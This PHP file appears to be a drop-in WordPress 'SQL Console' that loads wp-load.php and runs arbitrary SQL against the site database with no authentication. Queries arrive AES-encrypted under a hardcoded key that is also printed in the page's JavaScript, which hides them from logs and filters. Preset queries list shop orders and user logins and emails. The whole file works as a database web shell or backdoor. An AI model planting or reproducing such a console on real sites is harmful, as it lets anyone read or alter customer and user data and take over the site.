<?php
function find_wp_load() {
    $dir = __DIR__;
    while ($dir !== dirname($dir)) {
        if (file_exists($dir . '/wp-load.php')) {
            return $dir . '/wp-load.php';
        }
        $dir = dirname($dir);
    }
    return false;
}

$wp_load_path = find_wp_load();
if (!$wp_load_path) {
    die('Cannot locate wp-load.php');
}

require_once $wp_load_path;

global $wpdb;


define('AES_SECRET', 'your-password-or-secret-here'); 

function get_aes_key() {
  
    return md5(AES_SECRET, true);
}

function decrypt_sql_payload($encryptedBase64, $ivBase64) {
    $key = get_aes_key();

    $cipherRaw = base64_decode($encryptedBase64, true);
    $iv = base64_decode($ivBase64, true);

    if ($cipherRaw === false || $iv === false) {
        return false;
    }

    if (strlen($iv) !== 16) {
        return false;
    }

    $plain = openssl_decrypt(
        $cipherRaw,
        'AES-128-CBC',
        $key,
        OPENSSL_RAW_DATA,
        $iv
    );

    return $plain;
}

$sql_input = '';
$decrypt_error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['data']) && !empty($_POST['iv'])) {
        $decrypted = decrypt_sql_payload($_POST['data'], $_POST['iv']);
        if ($decrypted === false) {
            $decrypt_error = 'AES decrypt failed.';
        } else {
            $sql_input = trim($decrypted);
        }
    } 
}

$presets = [
    'SHOW TABLES' => 'SHOW TABLES;',
    'limit 10 order' => 'SELECT * FROM ' . $wpdb->prefix . 'posts WHERE post_type = "shop_order" ORDER BY ID DESC LIMIT 10;',
    'user' => 'SELECT ID, user_login, user_email FROM ' . $wpdb->prefix . 'users LIMIT 10;',
];
?>
<!DOCTYPE html>
<html>
<head>
    <title>SQL Console AES</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; padding: 20px; max-width: 1000px; margin: auto; }
        textarea { width: 100%; height: 120px; margin-top: 10px; }
        table { border-collapse: collapse; width: 100%; margin-top: 20px; }
        th, td { border: 1px solid #ccc; padding: 6px; word-break: break-all; }
        select, button { margin-top: 10px; }
        .tips { background: #f5f5f5; padding: 10px; margin: 10px 0; border-left: 4px solid #999; }
        .danger { color: #b00020; font-weight: bold; }
    </style>
</head>
<body>
    <h2>SQL Console (AES Encrypted)</h2>

    <div class="tips">
      
    </div>

    <form method="POST" id="sqlForm">
        <label for="presets">quick order：</label>
        <select id="presets" onchange="document.getElementById('sql').value = this.value;">
            <option value="">chose</option>
            <?php foreach ($presets as $label => $query): ?>
                <option value="<?= htmlspecialchars($query) ?>"><?= htmlspecialchars($label) ?></option>
            <?php endforeach; ?>
        </select>

        <textarea id="sql" placeholder="input SQL ..."><?= htmlspecialchars($sql_input) ?></textarea>

      
        <input type="hidden" name="data" id="data">
        <input type="hidden" name="iv" id="iv">

        <br>
        <button type="submit">execquery</button>
    </form>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
    <script>

        const AES_SECRET = 'your-password-or-secret-here';

        function md5ToWordArray(str) {
            return CryptoJS.MD5(str); // 128-bit，正好适合 AES-128
        }

        document.getElementById('sqlForm').addEventListener('submit', function(e) {
            const sql = document.getElementById('sql').value.trim();
            if (!sql) {
                e.preventDefault();
                alert('SQL is empty');
                return;
            }

            const key = md5ToWordArray(AES_SECRET);
            const iv = CryptoJS.lib.WordArray.random(16);

            const encrypted = CryptoJS.AES.encrypt(sql, key, {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            });

            document.getElementById('data').value = CryptoJS.enc.Base64.stringify(encrypted.ciphertext);
            document.getElementById('iv').value = CryptoJS.enc.Base64.stringify(iv);

            // 不再提交明文 SQL
            document.getElementById('sql').removeAttribute('name');
        });
    </script>

    <?php
    if (!empty($decrypt_error)) {
        echo '<p style="color:red;">' . esc_html($decrypt_error) . '</p>';
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($sql_input) && empty($decrypt_error)) {
        try {
            $result = $wpdb->get_results($sql_input, ARRAY_A);

            if ($wpdb->last_error) {
                echo '<p style="color:red;">Error: ' . esc_html($wpdb->last_error) . '</p>';
            } elseif (!empty($result)) {
                echo '<table><thead><tr>';
                foreach (array_keys($result[0]) as $col) {
                    echo '<th>' . esc_html($col) . '</th>';
                }
                echo '</tr></thead><tbody>';

                foreach ($result as $row) {
                    echo '<tr>';
                    foreach ($row as $val) {
                        echo '<td>' . esc_html((string)$val) . '</td>';
                    }
                    echo '</tr>';
                }

                echo '</tbody></table>';
            } else {
                echo '<p style="color:green;">Query OK. Rows affected: ' . intval($wpdb->rows_affected) . '</p>';
            }
        } catch (Exception $e) {
            echo '<p style="color:red;">Exception: ' . esc_html($e->getMessage()) . '</p>';
        }
    }
    ?>

    <hr>
    <p class="danger">
      1
    </p>
</body>
</html>